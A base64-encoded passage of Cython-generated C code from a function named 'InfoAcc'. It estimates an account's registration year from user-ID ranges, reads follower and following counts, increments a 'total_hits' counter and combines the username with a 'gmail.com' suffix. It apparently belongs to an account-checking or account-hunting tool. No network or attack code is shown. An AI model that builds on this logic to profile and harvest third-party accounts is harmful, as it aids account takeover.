CiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTYpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE2OwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNDIzOTUxNjc1NSwgX19weXhfdl91c2VyX2lkX2ludCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyMSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpKSB7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdXNlcl9pZF9pbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF82MzQ1MTA4MjA5LCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzIxLCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzIxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTcpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE3OwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNjM0NTEwODIxMCwgX19weXhfdl91c2VyX2lkX2ludCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyMywgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpKSB7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdXNlcl9pZF9pbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMDAxNjIzMjM5NSwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyMywgX19weXhfTDFfZXJyb3IpCiAgfQogIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDMyMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgaWYgKF9fcHl4X3RfOSkgewoKICAgIAogICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE4KTsKICAgIF9fcHl4X3ZfcmVnX2RhdGUgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxODsKCiAgICAKICAgIGdvdG8gX19weXhfTDExOwogIH0KCiAgCiAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMDE2MjMyMzk2LCBfX3B5eF92X3VzZXJfaWRfaW50LCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzI1LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMykpIHsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOwogICAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91c2VyX2lkX2ludCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI3MjM4NjAyMTU5LCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzI1LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzI1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTkpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE5OwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjcyMzg2MDIxNjAsIF9fcHl4X3ZfdXNlcl9pZF9pbnQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMjcsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8zKSkgewogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7CiAgICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VzZXJfaWRfaW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNDM0NjQ0NzUzOTUsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMjcsIF9fcHl4X0wxX2Vycm9yKQogIH0KICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzkgPCAwKSkpIF9fUFlYX0VSUigwLCAzMjcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIGlmIChfX3B5eF90XzkpIHsKCiAgICAKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAyMCk7CiAgICBfX3B5eF92X3JlZ19kYXRlID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMjA7CgogICAgCiAgICBnb3RvIF9fcHl4X0wxMTsKICB9CgogIAogIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF80MzQ2NDQ3NTM5NiwgX19weXhfdl91c2VyX2lkX2ludCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpKSB7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsKICAgIF9fcHl4X3RfMyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdXNlcl9pZF9pbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81MDI4OTI5NzY0NywgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDFfZXJyb3IpCiAgfQogIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgaWYgKF9fcHl4X3RfOSkgewoKICAgIAogICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDIxKTsKICAgIF9fcHl4X3ZfcmVnX2RhdGUgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAyMTsKCiAgICAKICAgIGdvdG8gX19weXhfTDExOwogIH0KCiAgCiAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzUwMjg5Mjk3NjQ4LCBfX3B5eF92X3VzZXJfaWRfaW50LCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzMxLCBfX3B5eF9MMV9lcnJvcikKICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMykpIHsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOwogICAgX19weXhfdF8zID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91c2VyX2lkX2ludCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzU3NDY0NzA3MDgyLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzMxLCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzMxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMjIpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDIyOwoKICAgIAogICAgZ290byBfX3B5eF9MMTE7CiAgfQoKICAKICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNTc0NjQ3MDcwODMsIF9fcHl4X3ZfdXNlcl9pZF9pbnQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMzMsIF9fcHl4X0wxX2Vycm9yKQogIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8zKSkgewogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7CiAgICBfX3B5eF90XzMgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VzZXJfaWRfaW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNjMzMTM0MjY5MzgsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMzMsIF9fcHl4X0wxX2Vycm9yKQogIH0KICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8zKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzkgPCAwKSkpIF9fUFlYX0VSUigwLCAzMzMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIGlmIChfX3B5eF90XzkpIHsKCiAgICAKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAyMyk7CiAgICBfX3B5eF92X3JlZ19kYXRlID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMjM7CgogICAgCiAgICBnb3RvIF9fcHl4X0wxMTsKICB9CgogIAogICB7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yMDI0X29yXzIwMjUpOwogICAgX19weXhfdl9yZWdfZGF0ZSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjAyNF9vcl8yMDI1OwogIH0KICBfX3B5eF9MMTE6OwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfYWNjb3VudF9pbmZvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzM4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMzgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3ZfZm9sbG93ZXJzID0gX19weXhfdF8xOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfNik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF92X2ZvbGxvd2Vycyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM0MCwgX19weXhfTDEyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2ZvbGxvd2VycywgX19weXhfdF8xKTsKICAgICAgX19weXhfdF8xID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgZ290byBfX3B5eF9MMTdfdHJ5X2VuZDsKICAgIF9fcHl4X0wxMl9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgCiAgICAgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xLCAmX19weXhfdF8zLCAmX19weXhfdF80KSA8IDApIF9fUFlYX0VSUigwLCAzNDEsIF9fcHl4X0wxNF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7CgogICAgICAKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2ZvbGxvd2VycywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBnb3RvIF9fcHl4X0wxM19leGNlcHRpb25faGFuZGxlZDsKICAgIH0KCiAgICAKICAgIF9fcHl4X0wxNF9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzYpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfNik7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDEzX2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzYpOwogICAgX19weXhfTDE3X3RyeV9lbmQ6OwogIH0KCiAgCiAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl9mb2xsb3dlcnMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF80MCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDM0MywgX19weXhfTDFfZXJyb3IpCiAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzQzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICBpZiAoX19weXhfdF85KSB7CgogICAgCiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOwogICAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICAgIGdvdG8gX19weXhfTDA7CgogICAgCiAgfQoKICAKICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfYWNjb3VudF9pbmZvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzQ2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNDYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIF9fcHl4X3ZfZm9sbG93aW5nID0gX19weXhfdF8zOwogIF9fcHl4X3RfMyA9IDA7CgogIAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG90YWxfaGl0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gX19QeXhfUHlMb25nX0FkZE9iakMoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90b3RhbF9oaXRzLCBfX3B5eF90XzQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKCiAgCiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzQ4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Jlc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoX19weXhfdF8xLCBfX3B5eF92X3VzZXJuYW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzQ4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzQ4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9mb2xsb3dlcnMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9mb2xsb3dpbmcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzQ4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3JlZ19kYXRlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDM0OCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAzNDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICBfX3B5eF90XzEzWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTY7CiAgX19weXhfdF8xM1sxXSA9IF9fcHl4X3RfNDsKICBfX3B5eF90XzEzWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTc7CiAgX19weXhfdF8xM1szXSA9IF9fcHl4X3RfMzsKICBfX3B5eF90XzEzWzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nbWFpbF9jb207CiAgX19weXhfdF8xM1s1XSA9IF9fcHl4X3RfMTsKICBfX3B5eF90XzEzWzZdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTg7CiAgX19weXhfdF8xM1s3XSA9IF9fcHl4X3RfMjsKICBfX3B5eF90XzEzWzhdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTk7CiAgX19weXhfdF8xM1s5XSA9IF9fcHl4X3RfMTA7CiAgX19weXhfdF8xM1sxMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yMDsKICBfX3B5eF90XzEzWzExXSA9IF9fcHl4X3RfMTE7CiAgX19weXhfdF8xM1sxMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5